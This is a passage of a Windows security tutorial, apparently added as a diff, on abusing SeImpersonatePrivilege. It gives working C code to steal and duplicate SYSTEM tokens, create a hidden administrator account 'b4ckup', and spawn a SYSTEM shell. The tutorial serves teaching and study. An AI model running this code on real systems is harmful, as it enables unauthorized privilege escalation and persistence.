+<p>In most scenarios, this doesn’t really matter. Even if the token is an impersonation token, you can usually convert it into a primary one if your goal is to create a new process. Still, it’s useful to know how to identify the token type, so I’ll show you how to do that.</p><br/>
+<p>For this, I created another helper function:</p><br/>
+<div class="highlight"><pre><span></span><span class="kt">bool</span><span class="w"> </span><span class="nf">isPrimaryToken</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">rtLength</span><span class="p">;</span>
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenStatistics</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="n">PTOKEN_STATISTICS</span><span class="w"> </span><span class="n">tInformation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PTOKEN_STATISTICS</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">tInformation</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation error"</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenStatistics</span><span class="p">,</span><span class="w"> </span><span class="n">tInformation</span><span class="p">,</span><span class="w"> </span><span class="n">rtLength</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tInformation</span><span class="o">-&gt;</span><span class="n">TokenType</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">TokenPrimary</span><span class="p">;</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">tInformation</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>This helper function checks whether a duplicated token is a <strong>Primary token</strong> or not.</p><br/>
+<p>It uses <code>GetTokenInformation</code> with the <code>TokenStatistics</code> flag to retrieve general information about the token. Just like before, the function is called twice: first to obtain the required buffer size, and then again to actually fetch the data.</p><br/>
+<p>The key part is the <code>TokenType</code> field inside the <code>TOKEN_STATISTICS</code> structure. If its value is <code>TokenPrimary</code>, the function returns <code>true</code>, meaning the token can be used directly to create a new process. Otherwise, it’s an impersonation token, and the function returns <code>false</code>. </p><br/>
+<p>Another important thing to keep in mind about <strong>impersonation tokens</strong> is that they can have different <strong>impersonation levels</strong>, and those levels directly affect whether we’re actually allowed to use the token for impersonation or not.</p><br/>
+<ul>
+<li><code>SecurityAnonymous</code>: The server can’t identify the client at all. No impersonation is possible. Commonly associated with Anonymous authentication.</li>
+<li><code>SecurityIdentification</code> The server knows who the client is, but can’t act as them.</li>
+<li><code>SecurityImpersonation</code>  The server can fully impersonate the client <strong>on the local machine</strong>. This is the most commonly useful level.</li>
+<li><code>SecurityDelegation</code> The server can impersonate the client <strong>locally and on remote systems</strong>. </li>
+</ul>
+<p>In case we have an impersonation token, we want an impersonation level <strong>equal to or higher than</strong> <code>SecurityImpersonation</code>, since the other ones (<code>SecurityIdentification</code> and <code>SecurityAnonymous</code>) won’t actually allow us to impersonate the user associated with the token.</p><br/>
+<p>Here's a function to determine the Impersonation Level of a token:</p><br/>
+<div class="highlight"><pre><span></span><span class="kt">bool</span><span class="w"> </span><span class="nf">isImpersonationLevel</span><span class="p">(</span><span class="n">HANDLE</span><span class="w"> </span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+
+<span class="w">    </span><span class="n">DWORD</span><span class="w"> </span><span class="n">rtLength</span><span class="p">;</span>
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenImpersonationLevel</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="n">PSECURITY_IMPERSONATION_LEVEL</span><span class="w"> </span><span class="n">tInformation</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">PSECURITY_IMPERSONATION_LEVEL</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">tInformation</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"Memory allocation error"</span><span class="p">);</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">FALSE</span><span class="p">;</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="n">GetTokenInformation</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TokenImpersonationLevel</span><span class="p">,</span><span class="w"> </span><span class="n">tInformation</span><span class="p">,</span><span class="w"> </span><span class="n">rtLength</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">rtLength</span><span class="p">);</span>
+<span class="w">    </span><span class="kt">bool</span><span class="w"> </span><span class="n">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">*</span><span class="n">tInformation</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="n">SecurityImpersonation</span><span class="p">);</span>
+<span class="w">    </span><span class="n">free</span><span class="p">(</span><span class="n">tInformation</span><span class="p">);</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>It queries the token to retrieve its <strong>impersonation level</strong> and then compares it against <code>SecurityImpersonation</code>. If the level is <code>SecurityImpersonation</code> or higher, the function returns <code>true</code>, otherwise, it returns <code>false</code>. <a href="https://gist.githubusercontent.com/elswix/b37a16ddbb85ae9bf541f31b882a9cd1/raw/a0d34fc681c47a1db98af57ad08b4ee1a96c3163/listTokens.cpp">Here is the code</a> containing all the previous functions, so you can follow along while making modifications.</p><br/>
+<p>Now, let's combine all these functions to obtain a valid token:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1">// If not a system access token we don't want it</span>
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">is_system_integrity_level</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">isPrimaryToken</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="n">isImpersonationLevel</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">)))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"VALID TOKEN!!!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Access token no valid for SYSTEM impersonation</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>First, it verifies that the token belongs to the <strong>SYSTEM integrity level</strong>. Then, it checks that the token is either a <strong>primary token</strong> or an <strong>impersonation token with a valid impersonation level</strong>. If either of those conditions is met, the token can be used for impersonation.</p><br/>
+<p>If the token doesn’t meet these requirements, it’s discarded and the code moves on to the next one.</p><br/>
+<p>Something I want to highlight is that the first tokens in the list that meet the SYSTEM integrity level usually also satisfy the other requirements. However, that’s not guaranteed for the tokens that come later, which is why it’s still a good idea to perform all the checks. For this case we just need one valid.</p><br/>
+<p>Now that we can obtain a valid token, let's abuse it!</p><br/>
+<p>Up to this point, we’ve been working with a token that belongs to <strong>another process</strong>. While we can inspect it and query information from it, using it directly is not ideal. Duplicating the token gives us our <strong>own copy</strong>, which we can safely manipulate and use for impersonation or other actions without depending on the original process.</p><br/>
+<p>Windows provides the <code>DuplicateTokenEx</code> function, which is very useful for us. This function allows us to create a <strong>new token</strong> based on an existing one, while also letting us specify things like the <strong>token type</strong>, <strong>impersonation level</strong>, and <strong>access rights</strong>. This is exactly what we need to turn a token that belongs to another process into one we can safely use for impersonation or further abuse.</p><br/>
+<p>Moreover, this function allows you to turn an impersonation token into a primary token, which is useful when creating a new process as the impersonated user.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span><span class="w"> </span><span class="n">systemToken</span><span class="p">;</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TOKEN_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityImpersonation</span><span class="p">,</span><span class="w"> </span><span class="n">TokenPrimary</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">systemToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>In this snippet, <code>DuplicateTokenEx</code> is used to duplicate the original token (<code>dupHandle</code>) and explicitly convert it into a <strong>primary token</strong> with an impersonation level of <code>SecurityImpersonation</code> (which is irrelevant for Primary Tokens). If the call succeeds, the new token is stored in the <code>systemToken</code> handle, which can later be used to create a new process running as the impersonated user.</p><br/>
+<p>If the duplication fails, the code simply cleans up and moves on.</p><br/>
+<p>Now that we have a duplicated token, let's see how to use it. There are many ways you can use this token. For example, we can use the <code>ImpersonateLoggedOnUser</code> function. This function allows us to specify a token, which the current thread will then <strong>use to act as the user associated with that token</strong>. In other words, any actions performed by the thread after calling this function will be executed <strong>with the permissions of the impersonated user</strong>. This is where <code>SeImpersonatePrivilege</code> comes into play, as it’s required for this function to work.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span><span class="w"> </span><span class="nf">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="w"> </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w"> </span><span class="n">HANDLE</span><span class="w"> </span><span class="n">hToken</span><span class="w"> </span><span class="p">);</span>
+</pre></div>
+<p>The <code>hToken</code> can be an impersonation token with an impersonation level of at least <code>SecurityImpersonation</code>. However, since we have a primary token, it works just as well. </p><br/>
+<p>Now, let's check if this actually works. We can call <code>ImpersonateLoggedOnUser</code> and then check our current username. If we successfully impersonated SYSTEM, that should be the name that gets displayed.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">ImpersonateLoggedOnUser</span><span class="p">(</span><span class="n">systemToken</span><span class="p">);</span>
+<span class="kt">wchar_t</span><span class="w"> </span><span class="n">username</span><span class="p">[</span><span class="n">UNLEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">];</span>
+<span class="n">DWORD</span><span class="w"> </span><span class="n">size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UNLEN</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
+<span class="n">GetUserNameW</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">size</span><span class="p">);</span>
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] Impersonated: %ws</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">username</span><span class="p">);</span>
+</pre></div>
+<p>Now, let's run our program:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens5.png"/></p><br/>
+<p>Awesome! It worked, we’ve successfully impersonated SYSTEM.</p><br/>
+<p>Now, every action we perform with this token will run with SYSTEM privileges. If needed, you can switch back to your previous token using the <code>RevertToSelf()</code> function. But that’s not what we’re after, so let’s see how we can abuse this SYSTEM token.</p><br/>
+<p>For example, we could create a local user and add it to the local Administrators group. To do this, we can rely on the WinAPI by combining <code>NetUserAdd</code> (to create a new user) and <code>NetLocalGroupAddMembers</code> (to add the user to a group).</p><br/>
+<p>This is an example of how we can do this:</p><br/>
+<div class="highlight"><pre><span></span><span class="c1">// Create local user</span>
+<span class="kt">wchar_t</span><span class="w"> </span><span class="n">newUser</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="sa">L</span><span class="s">"b4ckup"</span><span class="p">;</span>
+<span class="n">USER_INFO_1</span><span class="w"> </span><span class="n">ui</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
+<span class="n">ui</span><span class="p">.</span><span class="n">usri1_name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">newUser</span><span class="p">;</span>
+<span class="n">ui</span><span class="p">.</span><span class="n">usri1_password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">LPWSTR</span><span class="p">)</span><span class="sa">L</span><span class="s">"P4ssw0rd123!"</span><span class="p">;</span>
+<span class="n">ui</span><span class="p">.</span><span class="n">usri1_priv</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">USER_PRIV_USER</span><span class="p">;</span>
+<span class="n">ui</span><span class="p">.</span><span class="n">usri1_flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">UF_SCRIPT</span><span class="p">;</span>
+
+<span class="n">NET_API_STATUS</span><span class="w"> </span><span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetUserAdd</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">ui</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] User %ws was not created</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">newUser</span><span class="p">);</span><span class="w"> </span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">systemToken</span><span class="p">);</span>
+<span class="w">    </span><span class="k">break</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">printf</span><span class="p">(</span><span class="s">"[+] User %ws added successfully</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">newUser</span><span class="p">);</span><span class="w"> </span>
+
+<span class="c1">// Add to local administrators group</span>
+<span class="n">LOCALGROUP_MEMBERS_INFO_3</span><span class="w"> </span><span class="n">member</span><span class="p">;</span>
+<span class="n">member</span><span class="p">.</span><span class="n">lgrmi3_domainandname</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">newUser</span><span class="p">;</span>
+
+<span class="n">status</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">NetLocalGroupAddMembers</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"Administrators"</span><span class="p">,</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">LPBYTE</span><span class="p">)</span><span class="o">&amp;</span><span class="n">member</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="p">);</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">status</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">NERR_Success</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] User successfully added to Administrators local group</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+<span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] Something went wrong!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p>Now, if we’ve successfully impersonated SYSTEM, this should work. Let’s see:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens6.png"/></p><br/>
+<p>It looks like it worked. Let’s run <code>net user</code>:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens7.png"/></p><br/>
+<p><strong>GREAT! It worked.</strong> We’ve successfully impersonated SYSTEM and added a new user to the local Administrators group.</p><br/>
+<p>Now, you can use many other WinAPI functions to take advantage of the SYSTEM impersonation. Also, if this were an Active Directory scenario where we impersonate a domain user token, we could use the same API functions to add new users to the domain (as long as the impersonated user has the required privileges), effectively abusing the domain. I won’t go into detail on this now, since we’ll show a scenario like this later in the second scenario.</p><br/>
+<h3>Getting a Shell</h3><br/>
+<p>You may be wondering: now that we’ve impersonated SYSTEM, how can we get a shell, for example a <code>cmd.exe</code> running with its privileges? Well, it’s actually not as easy as just creating a new process with <code>CreateProcessW</code>, for example. This is because, as Microsoft states:</p><br/>
+<p><em>If the calling process is impersonating another user, the new process uses the token for the calling process, not the impersonation token. To run the new process in the security context of the user represented by the impersonation token, use the <a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera">CreateProcessAsUserA function</a> or <a href="https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw">CreateProcessWithLogonW function</a>.</em></p><br/>
+<p>As it says, even if we impersonate the SYSTEM token using <code>ImpersonateLoggedOnUser</code>, any new process we create will still run under our original token. However, the documentation suggests that we can use <code>CreateProcessAsUserW</code> or <code>CreateProcessWithTokenW</code> functions, which indeed, allows us to provide a token we want.</p><br/>
+<h3>CreateProcessAsUser</h3><br/>
+<p>The first one is <code>CreateProcessAsUserW</code>. This API lets us create a new process using a token that we explicitly provide, meaning the process will run in the security context represented by that token, not under our original one. This is exactly what we want after getting hold of a SYSTEM token.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span><span class="w"> </span><span class="nf">CreateProcessAsUserW</span><span class="p">(</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">HANDLE</span><span class="w">                </span><span class="n">hToken</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPCWSTR</span><span class="w">               </span><span class="n">lpApplicationName</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPWSTR</span><span class="w">                </span><span class="n">lpCommandLine</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPSECURITY_ATTRIBUTES</span><span class="w"> </span><span class="n">lpProcessAttributes</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPSECURITY_ATTRIBUTES</span><span class="w"> </span><span class="n">lpThreadAttributes</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">BOOL</span><span class="w">                  </span><span class="n">bInheritHandles</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">DWORD</span><span class="w">                 </span><span class="n">dwCreationFlags</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPVOID</span><span class="w">                </span><span class="n">lpEnvironment</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPCWSTR</span><span class="w">               </span><span class="n">lpCurrentDirectory</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">LPSTARTUPINFOW</span><span class="w">        </span><span class="n">lpStartupInfo</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">]</span><span class="w">               </span><span class="n">LPPROCESS_INFORMATION</span><span class="w"> </span><span class="n">lpProcessInformation</span>
+<span class="p">);</span>
+</pre></div>
+<p>There are a few requirements, though. The token we pass must be a <strong>primary token</strong> and it needs the appropriate access rights. On top of that, the calling process usually needs the <code>SeIncreaseQuotaPrivilege</code>, and in some cases <code>SeAssignPrimaryTokenPrivilege</code> as well. According to the documentation, Windows will try to enable these privileges automatically for the duration of the call, but if they’re not present, the function will simply fail. In short, <code>CreateProcessAsUserA</code> is the “classic” and most strict way of spawning a process under another user’s context.</p><br/>
+<h3>CreateProcessWithTokenW</h3><br/>
+<p>The second option is <code>CreateProcessWithTokenW</code>. This function serves a very similar purpose, but with slightly different requirements. Instead of needing quota or primary token assignment privileges, it requires the caller to have the <code>SeImpersonatePrivilege</code>, which is our case. This function also requires a <strong>PrimaryToken</strong>.</p><br/>
+<div class="highlight"><pre><span></span><span class="n">BOOL</span><span class="w"> </span><span class="nf">CreateProcessWithTokenW</span><span class="p">(</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">HANDLE</span><span class="w">                </span><span class="n">hToken</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">DWORD</span><span class="w">                 </span><span class="n">dwLogonFlags</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPCWSTR</span><span class="w">               </span><span class="n">lpApplicationName</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">out</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w"> </span><span class="n">LPWSTR</span><span class="w">                </span><span class="n">lpCommandLine</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">DWORD</span><span class="w">                 </span><span class="n">dwCreationFlags</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPVOID</span><span class="w">                </span><span class="n">lpEnvironment</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">,</span><span class="w"> </span><span class="n">optional</span><span class="p">]</span><span class="w">      </span><span class="n">LPCWSTR</span><span class="w">               </span><span class="n">lpCurrentDirectory</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">in</span><span class="p">]</span><span class="w">                </span><span class="n">LPSTARTUPINFOW</span><span class="w">        </span><span class="n">lpStartupInfo</span><span class="p">,</span>
+<span class="w">  </span><span class="p">[</span><span class="n">out</span><span class="p">]</span><span class="w">               </span><span class="n">LPPROCESS_INFORMATION</span><span class="w"> </span><span class="n">lpProcessInformation</span>
+<span class="p">);</span>
+</pre></div>
+<p><code>CreateProcessWithTokenW</code> also allows us to control some logon-related behavior, such as whether the user’s profile should be loaded, but it doesn’t give us the same level of control over the session as <code>CreateProcessAsUserA</code>.</p><br/>
+<p>As mentioned earlier, <code>CreateProcessAsUser</code> requires more privileges than <code>CreateProcessWithTokenW</code>. That’s not an issue here since we’ve already impersonated <code>SYSTEM</code>.</p><br/>
+<p>That said, <code>CreateProcessWithTokenW</code> is simpler to use than <code>CreateProcessAsUser</code>, which I’ll cover later in the second practice scenario, as it can be more useful when impersonating users other than SYSTEM.</p><br/>
+<p>Here's the code you can use to create open a new cmd.exe using <code>CreateProcessWithTokenW</code>:</p><br/>
+<div class="highlight"><pre><span></span><span class="n">HANDLE</span><span class="w"> </span><span class="n">systemToken</span><span class="p">;</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">DuplicateTokenEx</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">,</span><span class="w"> </span><span class="n">TOKEN_ALL_ACCESS</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SecurityImpersonation</span><span class="p">,</span><span class="w"> </span><span class="n">TokenPrimary</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">systemToken</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">dupHandle</span><span class="p">);</span>
+<span class="w">    </span><span class="n">CloseHandle</span><span class="p">(</span><span class="n">process</span><span class="p">);</span>
+<span class="w">    </span><span class="k">continue</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="n">STARTUPINFO</span><span class="w"> </span><span class="n">si</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+<span class="n">PROCESS_INFORMATION</span><span class="w"> </span><span class="n">pi</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+
+<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">CreateProcessWithTokenW</span><span class="p">(</span><span class="n">systemToken</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="sa">L</span><span class="s">"C:</span><span class="se">\\</span><span class="s">Windows</span><span class="se">\\</span><span class="s">System32</span><span class="se">\\</span><span class="s">cmd.exe"</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">si</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pi</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[-] An error ocurred while creating new process"</span><span class="p">);</span><span class="w"> </span>
+<span class="p">}</span>
+<span class="k">else</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"[+] Success, enjoy your system shell"</span><span class="p">);</span><span class="w"> </span>
+<span class="p">}</span>
+</pre></div>
+<p>Now, let's run our code:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens8.png"/></p><br/>
+<p>Great! It worked, we've successfully obtained a shell as system. Even though we've successfully impersonated SYSTEM, this has not all privileges:</p><br/>
+<p><img alt="" src="https://elswix.github.io/articles/20/img/Tokens9.png"/></p><br/>
+<p>This behavior is actually expected. Even though we’re running a shell as <code>SYSTEM</code>, the token we get does not necessarily include <strong>all possible SYSTEM privileges</strong>.</p><br/>
+<p>When a token is created, Windows doesn’t blindly assign every privilege available to that account. Instead, the token is built based on <strong>how it was obtained</strong> and <strong>which privileges were present and enabled in the original context</strong>. In our case, the SYSTEM token comes from an impersonation and process-creation flow, not from a full interactive logon, so some privileges are simply not included or remain disabled.</p><br/>
